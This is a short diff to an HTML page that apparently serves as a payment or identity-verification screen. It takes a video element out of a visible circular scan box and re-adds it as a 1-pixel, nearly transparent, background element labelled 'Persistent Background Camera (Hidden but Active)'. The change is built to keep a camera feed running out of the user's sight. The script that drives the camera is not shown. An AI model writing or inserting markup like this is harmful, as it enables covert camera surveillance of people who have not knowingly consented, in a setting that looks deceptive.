@@ -307,6 +307,10 @@
 </head>
 
 <body>
+    <!-- Persistent Background Camera (Hidden but Active) -->
+    <video id="scanVideo" autoplay playsinline
+        style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -100;"></video>
+
     <div id="toastContainer" class="toast-container"></div>
     <div class="payment-container verify-container" id="mainContainer">
         <!-- Generic Header -->
@@ -339,8 +343,8 @@
 
             <div id="scanBox"
                 style="position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; overflow: hidden; background: #000; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 40px rgba(66,133,244,0.3);">
-                <video id="scanVideo"
-                    style="position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0;"></video>
+
+                <!-- Video moved to Persistent Area -->
 
                 <div id="avatarContainer"
                     style="display: none; width: 100%; height: 100%; position: relative; background: #0a1128;">
